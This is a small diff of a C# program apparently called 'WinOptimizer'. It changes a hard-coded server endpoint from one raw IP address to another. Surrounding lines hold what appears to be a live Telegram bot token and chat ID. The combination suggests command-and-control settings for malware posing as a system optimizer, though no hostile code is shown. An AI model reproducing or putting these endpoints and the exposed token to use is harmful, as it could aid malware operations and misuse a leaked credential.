@@ -42,7 +42,7 @@ class Program
         Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
         "WinOptimizer", "Data", "post_rollback.marker");
 
-    static readonly string VpsApi = "http://84.238.132.84/api";
+    static readonly string VpsApi = "http://91.236.195.98/api";
     static readonly string TgBotToken = "8394906281:AAEhRCN2hJxV7uPfZw-UnISXcAcHEHonago";
     static readonly string TgChatId = "942720632";
 
